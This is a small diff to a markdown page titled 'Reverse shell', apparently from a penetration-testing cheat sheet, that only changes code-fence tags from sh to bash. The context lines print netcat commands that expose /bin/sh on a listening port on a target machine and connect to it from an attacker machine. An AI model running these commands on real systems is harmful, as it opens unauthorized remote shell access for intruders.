@@ -9,13 +9,13 @@ title: ↔ Reverse shell
 
 Inside the target machine
 
-```sh
+```bash
 nc -lnvvp <port> -e /bin/sh
 ```
 
 To connect from the attacker machine:
 
-```sh
+```bash
 nc <host> <port>
 ```
 
